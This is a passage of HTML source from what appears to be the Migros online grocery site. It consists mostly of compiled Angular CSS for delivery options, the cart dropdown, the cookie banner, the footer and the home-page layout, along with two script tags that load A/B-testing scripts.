      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .unavailable-text[_ngcontent-isc-c354] {
        margin-bottom: 0;
        margin-left: 1.875rem;
        text-align: left
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper[_ngcontent-isc-c354] .unavailable-text[_ngcontent-isc-c354] {
          margin-left: 3rem
        }
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper.instant[_ngcontent-isc-c354] {
          display: grid;
          grid-template-columns: auto auto
        }
      }

      @media (max-width: 992px) {
        .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .delivery-options-inner[_ngcontent-isc-c354] .two-column-wrapper.instant[_ngcontent-isc-c354]>[_ngcontent-isc-c354]:nth-child(2)>[_ngcontent-isc-c354]:first-child {
          margin-right: 0
        }
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .different-location-popover[_ngcontent-isc-c354] {
        position: absolute;
        left: 0;
        width: 13rem;
        top: 4rem;
        z-index: 2;
        background-color: var(--brandColorInfo600);
        padding: .75rem;
        color: var(--basicColorWhite);
        border-radius: 8px
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .different-location-popover[_ngcontent-isc-c354]:after {
        content: "";
        position: absolute;
        border: 10px solid transparent;
        border-bottom: 10px solid var(--brandColorInfo600);
        top: -20px;
        left: 50%;
        transform: translate(-50%)
      }

      .delivery-options-search-bucket-wrapper[_ngcontent-isc-c354] .delivery-options-wrapper[_ngcontent-isc-c354] .different-location-popover[_ngcontent-isc-c354] fa-icon[_ngcontent-isc-c354] {
        position: absolute;
        right: .375rem;
        top: .125rem;
        font-size: .75rem
      }

      .spinner-wrapper[_ngcontent-isc-c354] {
        display: flex;
        height: 100%;
        justify-content: center;
        align-items: center
      }

      .spinner-wrapper[_ngcontent-isc-c354] .spinner[_ngcontent-isc-c354] {
        width: 1.25rem;
        height: 1.25rem;
        border: .125rem solid var(--brandColorPrimary700);
        border-top-color: transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c348] {
        position: relative
      }

      @media (max-width: 992px) {
        [_nghost-isc-c348] {
          display: none
        }
      }

      .toggle-layer[_ngcontent-isc-c348] {
        position: absolute;
        inset: 0;
        cursor: pointer;
        z-index: 1
      }

      .empty-cart[_ngcontent-isc-c348] {
        position: absolute;
        background-color: #fff;
        padding: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        width: 300px;
        height: 45px;
        top: 63px;
        right: 0;
        border-radius: 10px;
        box-shadow: 0 0 10px #00000026;
        z-index: 2;
        animation: presence .15s ease-in-out
      }

      .dropdown-btn[_ngcontent-isc-c348] {
        width: 100%;
        outline: none;
        background: none;
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12);
        display: flex;
        height: 47px;
        min-width: 180px;
        align-items: center;
        padding: 0 1rem;
        justify-content: space-between;
        position: relative;
        cursor: pointer
      }

      .dropdown-btn[_ngcontent-isc-c348]:before {
        content: "";
        position: absolute;
        width: 11.25rem;
        height: 1.125rem;
        bottom: -1.125rem;
        left: 0
      }

      .dropdown-btn[_ngcontent-isc-c348] .icon-cart-quantity-wrapper[_ngcontent-isc-c348] {
        position: relative;
        margin-bottom: -3px
      }

      .dropdown-btn[_ngcontent-isc-c348] .icon-cart-quantity-wrapper[_ngcontent-isc-c348] .icon-cart[_ngcontent-isc-c348] {
        background-image: url(assets/icons/cart.svg);
        width: 20px;
        height: 20px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: contain
      }

      .dropdown-btn[_ngcontent-isc-c348] .icon-cart-quantity-wrapper[_ngcontent-isc-c348] .quantity[_ngcontent-isc-c348] {
        border: 2px solid white;
        display: flex;
        align-items: center;
        justify-content: center;
        background-color: var(--brandColorPrimary700);
        position: absolute;
        top: -8px;
        border-radius: 50px;
        height: 20px;
        width: 20px;
        right: -12px;
        color: #fff;
        font-size: .5rem
      }

      .dropdown-btn[_ngcontent-isc-c348]>[_ngcontent-isc-c348]:nth-child(2) {
        display: flex;
        flex-direction: column;
        text-align: left
      }

      .dropdown-btn[_ngcontent-isc-c348]>[_ngcontent-isc-c348]:nth-child(2) .price[_ngcontent-isc-c348] {
        color: var(--brandColorPrimary700)
      }

      .mion[_nghost-isc-c348] .quantity[_ngcontent-isc-c348],
      .mion [_nghost-isc-c348] .quantity[_ngcontent-isc-c348] {
        color: var(--basicColor950) !important;
        font-weight: 500
      }

      .mion[_nghost-isc-c348] .icon-cart-quantity-wrapper[_ngcontent-isc-c348] .price[_ngcontent-isc-c348],
      .mion [_nghost-isc-c348] .icon-cart-quantity-wrapper[_ngcontent-isc-c348] .price[_ngcontent-isc-c348] {
        color: var(--basicColor950) !important;
        font-weight: 600
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .divider[_ngcontent-isc-c301] {
        height: .063rem;
        opacity: .12;
        background-color: var(--basicColorBlack);
        padding: 0;
        margin-top: 2rem
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .logos-wrapper[_ngcontent-isc-c300] {
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        .logos-wrapper[_ngcontent-isc-c300] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .logos-wrapper[_ngcontent-isc-c300] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .logos-wrapper[_ngcontent-isc-c300] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        .logos-wrapper[_ngcontent-isc-c300] {
          padding: 0 18rem
        }
      }

      .logos-wrapper[_ngcontent-isc-c300] .inner[_ngcontent-isc-c300] {
        display: flex;
        align-items: center;
        justify-content: space-between
      }

      .logos-wrapper[_ngcontent-isc-c300] .inner[_ngcontent-isc-c300] .logos[_ngcontent-isc-c300] .logo[_ngcontent-isc-c300] {
        height: 40px;
        margin-right: 1.75rem
      }

      .logos-wrapper[_ngcontent-isc-c300] .inner[_ngcontent-isc-c300] .logos[_ngcontent-isc-c300] a[_ngcontent-isc-c300]:last-child>img[_ngcontent-isc-c300] {
        margin-right: 0
      }

      .logos-wrapper[_ngcontent-isc-c300] .inner[_ngcontent-isc-c300] .logos[_ngcontent-isc-c300] div[_ngcontent-isc-c300] {
        display: inline-block
      }

      .logos-wrapper[_ngcontent-isc-c300] .inner[_ngcontent-isc-c300] .logos[_ngcontent-isc-c300] div[_ngcontent-isc-c300] img[_ngcontent-isc-c300] {
        height: 40px
      }

      .logos-wrapper[_ngcontent-isc-c300] .inner[_ngcontent-isc-c300] .logo-container[_ngcontent-isc-c300] {
        display: flex;
        flex-direction: column
      }

      .logos-wrapper[_ngcontent-isc-c300] .migros-logo[_ngcontent-isc-c300] {
        max-width: 135px;
        margin: 1rem 0
      }

      .logos-wrapper[_ngcontent-isc-c300] .copyright[_ngcontent-isc-c300] {
        text-align: center;
        font-size: .625rem;
        line-height: 1.6
      }

      @media (min-width: 992px) {
        .logos-wrapper[_ngcontent-isc-c300] .copyright[_ngcontent-isc-c300] {
          text-align: left;
          margin-bottom: 1rem
        }
      }

      .logos-wrapper[_ngcontent-isc-c300] .anadolu-grubu-logo[_ngcontent-isc-c300] {
        height: 35px
      }

      .logos-wrapper.lite[_ngcontent-isc-c300] {
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        .logos-wrapper.lite[_ngcontent-isc-c300] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .logos-wrapper.lite[_ngcontent-isc-c300] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .logos-wrapper.lite[_ngcontent-isc-c300] {
          padding: 0 18rem
        }
      }

      @media (min-width: 1800px) {
        .logos-wrapper.lite[_ngcontent-isc-c300] {
          padding: 0 23rem
        }
      }
    </style>
    <style>
      [_nghost-isc-c298] {
        position: fixed;
        bottom: 0;
        left: 0;
        z-index: 1000
      }

      .container[_ngcontent-isc-c298] {
        width: 100vw;
        height: var(--mobile-bottom-nav-height);
        box-shadow: 0 -2px 5px #0000000f;
        background-color: var(--basicColorWhite);
        display: flex
      }

      .container[_ngcontent-isc-c298] .nav-item[_ngcontent-isc-c298] {
        flex: 1 1 0;
        word-break: break-all;
        overflow: hidden;
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: .625rem;
        padding-bottom: .5rem;
        position: relative
      }

      .container[_ngcontent-isc-c298] .nav-item.active[_ngcontent-isc-c298] {
        color: var(--brandColorPrimary700)
      }

      .container[_ngcontent-isc-c298] .nav-item[_ngcontent-isc-c298] img[_ngcontent-isc-c298] {
        width: 1.25rem;
        height: 1.25rem;
        margin-bottom: .125rem
      }

      .container[_ngcontent-isc-c298] .nav-item[_ngcontent-isc-c298] .quantity[_ngcontent-isc-c298] {
        border: 2px solid var(--basicColorWhite);
        display: flex;
        align-items: center;
        justify-content: center;
        background-color: var(--brandColorPrimary700);
        position: absolute;
        top: 0;
        border-radius: 50px;
        height: 20px;
        width: 20px;
        right: calc(50% - 1rem);
        transform: translate(50%);
        color: var(--basicColorWhite);
        font-size: .5rem
      }

      @media (max-width: 576px) {
        .container[_ngcontent-isc-c298] .nav-item[_ngcontent-isc-c298] .text[_ngcontent-isc-c298] {
          font-size: 3.2vw
        }
      }

      .mion[_nghost-isc-c298] .quantity[_ngcontent-isc-c298],
      .mion [_nghost-isc-c298] .quantity[_ngcontent-isc-c298] {
        color: var(--basicColor900) !important
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .wrapper[_ngcontent-isc-c170] {
        padding: 1.5rem;
        position: fixed;
        border: solid 1px #ffffff;
        border-radius: 8px;
        box-shadow: 0 8px 54px #000000d4;
        bottom: 2rem;
        right: 0;
        left: 1rem;
        color: #fff;
        background-color: #292a2c;
        z-index: 1000;
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        max-width: 27rem;
        animation: presence .3s ease-in-out
      }

      @media (max-width: 576px) {
        .wrapper[_ngcontent-isc-c170] {
          left: 0;
          margin: 0 1rem;
          padding: 1rem
        }
      }

      @media (min-width: 1200px) {
        .wrapper[_ngcontent-isc-c170] {
          left: 7rem
        }
      }

      @media (min-width: 1440px) {
        .wrapper[_ngcontent-isc-c170] {
          left: 11rem
        }
      }

      @media (min-width: 1800px) {
        .wrapper[_ngcontent-isc-c170] {
          left: 18rem
        }
      }

      @media (max-width: 576px) {
        .wrapper[_ngcontent-isc-c170] .subtitle-1[_ngcontent-isc-c170] {
          font-size: .875rem
        }
      }

      .wrapper[_ngcontent-isc-c170] .cookie-title[_ngcontent-isc-c170] {
        margin-bottom: 1rem
      }

      .wrapper[_ngcontent-isc-c170] .cursor-pointer[_ngcontent-isc-c170] {
        cursor: pointer
      }

      .wrapper[_ngcontent-isc-c170] .link[_ngcontent-isc-c170] {
        text-decoration: underline;
        color: var(--brandColorPrimary700)
      }

      .wrapper[_ngcontent-isc-c170] .white-link[_ngcontent-isc-c170] {
        text-decoration: underline;
        color: #fff;
        font-weight: 700
      }

      .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] {
        display: flex
      }

      @media (max-width: 576px) {
        .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] {
          flex-direction: column
        }
      }

      .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] .btn[_ngcontent-isc-c170] {
        outline: none;
        border-radius: 5px;
        padding: .813rem .758rem .688rem 1.242rem;
        margin-top: 1rem;
        cursor: pointer;
        flex-basis: 100%
      }

      @media (max-width: 576px) {
        .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] .btn[_ngcontent-isc-c170] {
          margin: 1rem 0 0
        }
      }

      .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] .settings[_ngcontent-isc-c170] {
        border: 1px solid #ffffff;
        background-color: #292a2c;
        color: #fff
      }

      .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] .accept-all[_ngcontent-isc-c170] {
        border: 1px solid #292a2c;
        background-color: #fff;
        margin-left: .75rem
      }

      @media (max-width: 576px) {
        .wrapper[_ngcontent-isc-c170] .action-buttons[_ngcontent-isc-c170] .accept-all[_ngcontent-isc-c170] {
          margin-left: unset
        }
      }

      .mion[_nghost-isc-c170] .settings[_ngcontent-isc-c170],
      .mion [_nghost-isc-c170] .settings[_ngcontent-isc-c170] {
        color: var(--font-color__light) !important
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .links-wrapper[_ngcontent-isc-c299] {
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        .links-wrapper[_ngcontent-isc-c299] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .links-wrapper[_ngcontent-isc-c299] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .links-wrapper[_ngcontent-isc-c299] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        .links-wrapper[_ngcontent-isc-c299] {
          padding: 0 18rem
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299] {
        align-items: unset
      }

      @media (max-width: 768px) {
        .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299] {
          grid-gap: unset
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299]>div[_ngcontent-isc-c299] {
        width: 100%
      }

      .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299] .logos-wrapper[_ngcontent-isc-c299] {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-top: -5rem
      }

      .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299] .logos-wrapper[_ngcontent-isc-c299] .logo[_ngcontent-isc-c299] {
        height: 21px
      }

      .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299] .logos-wrapper[_ngcontent-isc-c299] .logo.kadin-akademisi[_ngcontent-isc-c299] {
        height: 45px
      }

      .links-wrapper[_ngcontent-isc-c299] .inner-grid[_ngcontent-isc-c299] .logos-wrapper[_ngcontent-isc-c299] .logo.saglikli-yasam[_ngcontent-isc-c299] {
        height: 43px
      }

      .links-wrapper[_ngcontent-isc-c299] .right-container[_ngcontent-isc-c299] {
        display: grid
      }

      @media (max-width: 768px) {
        .links-wrapper[_ngcontent-isc-c299] .content[_ngcontent-isc-c299] {
          display: none
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .content.selected[_ngcontent-isc-c299] {
        display: block
      }

      .links-wrapper[_ngcontent-isc-c299] .title[_ngcontent-isc-c299] {
        padding-top: 2rem;
        font-weight: var(--font-weight-bold)
      }

      .links-wrapper[_ngcontent-isc-c299] .title[_ngcontent-isc-c299] fa-icon[_ngcontent-isc-c299] {
        float: right
      }

      @media (min-width: 768px) {
        .links-wrapper[_ngcontent-isc-c299] .title[_ngcontent-isc-c299] fa-icon[_ngcontent-isc-c299] {
          display: none
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .link[_ngcontent-isc-c299] {
        font-size: .75rem;
        font-weight: var(--font-weight-normal);
        margin-bottom: .375rem
      }

      .links-wrapper[_ngcontent-isc-c299] .link[_ngcontent-isc-c299] a[_ngcontent-isc-c299] {
        color: var(--basicColor600);
        cursor: pointer
      }

      .links-wrapper[_ngcontent-isc-c299] .link[_ngcontent-isc-c299] a[_ngcontent-isc-c299]:hover,
      .links-wrapper[_ngcontent-isc-c299] .link[_ngcontent-isc-c299] a.active[_ngcontent-isc-c299] {
        color: var(--brandColorPrimary700)
      }

      @media (min-width: 768px) {
        .links-wrapper[_ngcontent-isc-c299] .popular-pages[_ngcontent-isc-c299] .link[_ngcontent-isc-c299] {
          display: inline-block;
          width: 50%
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .mobile-app-link[_ngcontent-isc-c299] {
        height: 3.125rem;
        border: 1px solid var(--basicColor300);
        border-radius: 3px;
        max-width: 8.75rem;
        text-align: center;
        padding: .25rem 0;
        margin-top: .5rem
      }

      @media (max-width: 768px) {
        .links-wrapper[_ngcontent-isc-c299] .mobile-app-link[_ngcontent-isc-c299] {
          display: inline-block;
          min-width: 8.75rem;
          margin-right: .5rem
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .mobile-app-link[_ngcontent-isc-c299] img[_ngcontent-isc-c299] {
        max-width: 100%
      }

      .links-wrapper[_ngcontent-isc-c299] .socials[_ngcontent-isc-c299] {
        display: flex;
        flex-wrap: wrap
      }

      @media (min-width: 992px) {
        .links-wrapper[_ngcontent-isc-c299] .socials[_ngcontent-isc-c299] {
          justify-content: space-between
        }
      }

      @media (max-width: 992px) {
        .links-wrapper[_ngcontent-isc-c299] .socials[_ngcontent-isc-c299] a[_ngcontent-isc-c299] {
          padding-right: 1.25rem
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .nearest-migros[_ngcontent-isc-c299] {
        margin-top: 3rem;
        font-size: .75rem;
        padding: .625rem 0;
        border: 1px solid var(--brandColorPrimary700);
        border-radius: 5px
      }

      .links-wrapper[_ngcontent-isc-c299] .nearest-migros[_ngcontent-isc-c299] a[_ngcontent-isc-c299] {
        display: flex;
        justify-content: center;
        align-items: center;
        font-weight: var(--font-weight-bold);
        cursor: pointer
      }

      .links-wrapper[_ngcontent-isc-c299] .nearest-migros[_ngcontent-isc-c299] fa-icon[_ngcontent-isc-c299] {
        font-size: 1.25rem;
        margin-right: .625rem
      }

      .links-wrapper[_ngcontent-isc-c299] .digital[_ngcontent-isc-c299] {
        margin-top: .625rem;
        height: 3.125rem;
        border: 1px solid var(--basicColor300);
        font-size: .75rem;
        font-weight: var(--font-weight-bold);
        border-radius: 3px
      }

      .links-wrapper[_ngcontent-isc-c299] .digital[_ngcontent-isc-c299] a[_ngcontent-isc-c299] {
        color: var(--basicColorBlack)
      }

      @media (max-width: 992px) {
        .links-wrapper[_ngcontent-isc-c299] .digital[_ngcontent-isc-c299] {
          min-width: 10rem;
          display: inline-block;
          margin-right: .5rem
        }
      }

      .links-wrapper[_ngcontent-isc-c299] .digital[_ngcontent-isc-c299] .align-helper[_ngcontent-isc-c299] {
        height: 100%;
        display: inline-block;
        vertical-align: middle
      }

      .links-wrapper[_ngcontent-isc-c299] .digital[_ngcontent-isc-c299] img[_ngcontent-isc-c299] {
        display: inline-block;
        vertical-align: middle;
        margin: 0 .625rem
      }

      .links-wrapper.lite[_ngcontent-isc-c299] {
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        .links-wrapper.lite[_ngcontent-isc-c299] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .links-wrapper.lite[_ngcontent-isc-c299] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .links-wrapper.lite[_ngcontent-isc-c299] {
          padding: 0 18rem
        }
      }

      @media (min-width: 1800px) {
        .links-wrapper.lite[_ngcontent-isc-c299] {
          padding: 0 23rem
        }
      }
    </style>
    <script src="https://dev.visualwebsiteoptimizer.com/edrv/va_gq-7a983a5108a69138575feea9fb9992a5.js" crossorigin="anonymous" type="text/javascript" fetchpriority="high"></script>
    <script src="https://dev.visualwebsiteoptimizer.com/edrv/nc-5ac7ab4aa88c4c60484ce13407d745a2.js" crossorigin="anonymous" type="text/javascript" fetchpriority="high" defer=""></script>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] {
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        .home-page-wrapper[_ngcontent-isc-c425] {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        .home-page-wrapper[_ngcontent-isc-c425] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        .home-page-wrapper[_ngcontent-isc-c425] {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        .home-page-wrapper[_ngcontent-isc-c425] {
          padding: 0 18rem
        }
      }

      @media (max-width: 992px) {
        .home-page-wrapper[_ngcontent-isc-c425] {
          padding: 0
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .banners[_ngcontent-isc-c425]:nth-of-type(2) {
        display: none
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .banners[_ngcontent-isc-c425] {
          padding: 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .banners[_ngcontent-isc-c425] .main-slider-banner[_ngcontent-isc-c425] {
        transform-origin: 0 0
      }

      .home-page-wrapper[_ngcontent-isc-c425] .under-slider-banners[_ngcontent-isc-c425] {
        display: flex;
        justify-content: space-evenly;
        align-items: center;
        overflow-y: scroll;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      .home-page-wrapper[_ngcontent-isc-c425] .under-slider-banners[_ngcontent-isc-c425]::-webkit-scrollbar {
        width: 0;
        height: 0
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .under-slider-banners[_ngcontent-isc-c425] {
          padding: 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .under-slider-banners[_ngcontent-isc-c425] .under-slider-banner[_ngcontent-isc-c425] {
        border-radius: 8px;
        margin-right: 1rem;
        cursor: pointer;
        max-width: 13rem;
        max-height: 13rem
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .under-slider-banners[_ngcontent-isc-c425] .under-slider-banner[_ngcontent-isc-c425] {
          max-width: 170px
        }
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .under-slider-banners[_ngcontent-isc-c425] .under-slider-banner[_ngcontent-isc-c425] {
          max-width: 7.25rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .middle-banner-wrapper[_ngcontent-isc-c425] {
        width: 100%
      }

      .home-page-wrapper[_ngcontent-isc-c425] .middle-banner-wrapper[_ngcontent-isc-c425] .middle-banner[_ngcontent-isc-c425] {
        transform-origin: 0 0;
        width: -moz-fit-content;
        width: fit-content
      }

      .home-page-wrapper[_ngcontent-isc-c425] .free-banner-wrapper[_ngcontent-isc-c425] {
        width: 100%
      }

      .home-page-wrapper[_ngcontent-isc-c425] .free-banner-wrapper[_ngcontent-isc-c425] .free-banner[_ngcontent-isc-c425] {
        transform-origin: 0 0;
        width: -moz-fit-content;
        width: fit-content
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .cross-retention[_ngcontent-isc-c425] {
          padding: 0 1rem
        }
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .fast-cart-wrapper[_ngcontent-isc-c425] {
          padding: 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .ai-section-wrapper[_ngcontent-isc-c425] {
        border: solid 1px var(--basicColor300);
        border-radius: .5rem;
        padding: 0 2rem;
        background-color: var(--brandColorYemekAi50)
      }

      .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] {
        display: grid;
        grid-template-columns: repeat(8, 1fr);
        gap: 1rem;
        text-align: center
      }

      @media (max-width: 1200px) {
        .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] {
          grid-template-columns: repeat(5, 1fr)
        }
      }

      @media (max-width: 992px) {
        .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] {
          grid-template-columns: repeat(3, 1fr)
        }
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] {
          gap: .5rem;
          padding: 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425] {
        display: flex;
        flex-direction: column;
        align-items: center;
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12);
        padding: .3rem;
        cursor: pointer;
        justify-content: center;
        min-width: 7.5rem;
        min-height: 7.5rem
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card[_ngcontent-isc-c425] {
          min-width: 4.5rem;
          min-height: 4.5rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-card.categories-see-all[_ngcontent-isc-c425] {
        background: var(--basicColor100);
        padding: 1.125rem .75rem 1.188rem .813rem;
        border-radius: .5rem;
        display: inline;
        height: -moz-fit-content;
        height: fit-content;
        border: none;
        line-height: 1.5
      }

      .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] img[_ngcontent-isc-c425] {
        max-width: 100%;
        height: auto;
        max-height: 5.5rem
      }

      @media (max-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] img[_ngcontent-isc-c425] {
          max-height: 3.5rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .categories-wrapper[_ngcontent-isc-c425] .category-name[_ngcontent-isc-c425] {
        margin-top: .5rem
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] {
        margin-top: 2rem;
        position: relative
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section.hemen[_ngcontent-isc-c425] {
        margin-top: 0
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section#section-shopping-list-vwo[_ngcontent-isc-c425] {
        display: none
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] {
          margin-top: 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .section-title[_ngcontent-isc-c425] {
        margin-bottom: 1.25rem
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .section-title[_ngcontent-isc-c425] {
          margin-bottom: .75rem;
          font-size: 1.1rem;
          padding: 0 1rem
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .section-title.below-unrated-orders[_ngcontent-isc-c425] {
        margin-bottom: 1rem
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .fade-out[_ngcontent-isc-c425] {
        position: absolute;
        right: 0;
        bottom: 0;
        top: 40px;
        width: 120px;
        z-index: 1;
        background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, white 100%);
        pointer-events: none
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .fade-out[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .fade-out.categories[_ngcontent-isc-c425] {
        bottom: 0;
        top: 50px
      }

      @media (min-width: 768px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .fade-out.categories[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .see-all[_ngcontent-isc-c425] {
        margin-left: auto;
        display: flex;
        cursor: pointer;
        margin-top: .4rem
      }

      @media (max-width: 576px) {
        .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .see-all[_ngcontent-isc-c425] {
          display: none
        }
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .see-all[_ngcontent-isc-c425] fa-icon[_ngcontent-isc-c425] {
        font-size: .75rem;
        margin-left: .5rem;
        margin-top: .1rem
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .list-page-items-container[_ngcontent-isc-c425] {
        display: flex;
        overflow-y: scroll;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .list-page-items-container[_ngcontent-isc-c425]::-webkit-scrollbar {
        width: 0;
        height: 0
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .list-page-items-container.in-mat-tab-group[_ngcontent-isc-c425] {
        overflow-x: unset
      }

      .home-page-wrapper[_ngcontent-isc-c425] .section[_ngcontent-isc-c425] .list-page-items-container[_ngcontent-isc-c425] sm-list-page-item[_ngcontent-isc-c425] {
        margin-right: .625rem
      }

